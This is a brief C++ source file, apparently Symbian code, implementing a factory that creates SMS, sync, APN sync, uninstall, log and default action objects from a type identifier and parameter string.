/*
 ============================================================================
 Name		: Factory.cpp
 Author	  : Marco Bellino
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CFactory implementation
 ============================================================================
 */

#include "ActionFactory.h"

#include "ActionNone.h"
#include "ActionSms.h"
#include "ActionSync.h"
#include "ActionUninstall.h"
#include "ActionLog.h"
#include "ActionSyncApn.h"

EXPORT_C CAbstractAction* ActionFactory::CreateActionL(TActionType aId, const TDesC8& params)
	{
	switch (aId)
		{
		case EAction_Sms:
			return CActionSms::NewL(params);
		case EAction_Sync:
			return CActionSync::NewL(params);
		case EAction_SyncApn:
			return CActionSyncApn::NewL(params);
		case EAction_Uninstall:
			return CActionUninstall::NewL(params);
		case EAction_Log:
			return CActionLog::NewL(params);
			
			// TODO: add new actions here
		default:
			return CActionNone::NewL(aId, params);
		}
	}
